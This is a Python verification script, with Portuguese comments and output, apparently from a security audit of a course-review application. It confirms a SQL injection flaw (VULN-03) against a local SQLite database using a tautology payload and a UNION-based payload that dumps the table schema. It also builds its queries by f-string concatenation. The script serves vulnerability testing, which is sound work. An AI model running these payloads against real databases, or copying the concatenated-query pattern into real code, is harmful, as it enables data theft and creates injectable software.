#!/usr/bin/env python3
"""
Teste de Verificação e Demonstração - VULN-03: SQL Injection em Consultas de Cursos
Verifica a vulnerabilidade de concatenação de strings em consultas SQL em blueprints/courses.py.
"""

import sys
import sqlite3
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent.parent.parent
DB_PATH = BASE_DIR / "backend" / "cornell-course-sphere-data" / "roster_reviews.sqlite.db"

def run_test():
    print("=" * 60)
    print("[TESTE VULN-03] Verificação de SQL Injection (blueprints/courses.py)")
    print("=" * 60)

    if not DB_PATH.exists():
        print(f"[-] Banco SQLite não encontrado em {DB_PATH}")
        return False

    conn = sqlite3.connect(str(DB_PATH))
    cursor = conn.cursor()

    # 1. Consulta Legítima com Semestre Válido
    legitimate_semester = "FA23"
    print(f"\n[1] Executando consulta legítima com semester='{legitimate_semester}'...")
    query_legit = f"SELECT * FROM courses WHERE semester = '{legitimate_semester}'"
    print(f"    SQL: {query_legit}")
    cursor.execute(query_legit)
    results_legit = cursor.fetchall()
    print(f"    Total de cursos encontrados: {len(results_legit)}")

    # 2. Injeção SQL: Bypass de Condição (' OR '1'='1)
    injection_payload = "' OR '1'='1"
    print(f"\n[2] Executando consulta com payload malicioso: semester=\"{injection_payload}\"...")
    query_vuln = f"SELECT * FROM courses WHERE semester = '{injection_payload}'"
    print(f"    SQL Resultante: {query_vuln}")

    cursor.execute(query_vuln)
    results_vuln = cursor.fetchall()
    print(f"    Total de registros retornados (Bypass total): {len(results_vuln)}")

    # 3. Teste de Union-Based SQL Injection para extração de metadados (tabela courses tem 6 colunas)
    union_payload = "' UNION SELECT 9999, 'SCHEMA_DUMP', 0, 'FA23', 'SEC', sql FROM sqlite_master WHERE type='table' --"
    print(f"\n[3] Testando UNION-based SQLi para extração do schema:")
    query_union = f"SELECT * FROM courses WHERE semester = '{union_payload}'"
    print(f"    SQL Resultante: {query_union}")
    try:
        cursor.execute(query_union)
        schema_dump = cursor.fetchall()
        print(f"    [+] Dados extraídos via UNION ({len(schema_dump)} linhas):")
        for row in schema_dump:
            print(f"       -> {row}")
    except Exception as e:
        print(f"    [-] Erro durante extração: {e}")

    conn.close()

    if len(results_vuln) > len(results_legit):
        print("\n[ALERTA DE VULNERABILIDADE DETECTADO] VULN-03 CONFIRMADA!")
        print(f"[!] A concatenação direta via f-string permitiu alterar a lógica da query e despejar todo o banco.")
        return True
    return False

if __name__ == "__main__":
    is_vuln = run_test()
    sys.exit(0 if is_vuln else 1)
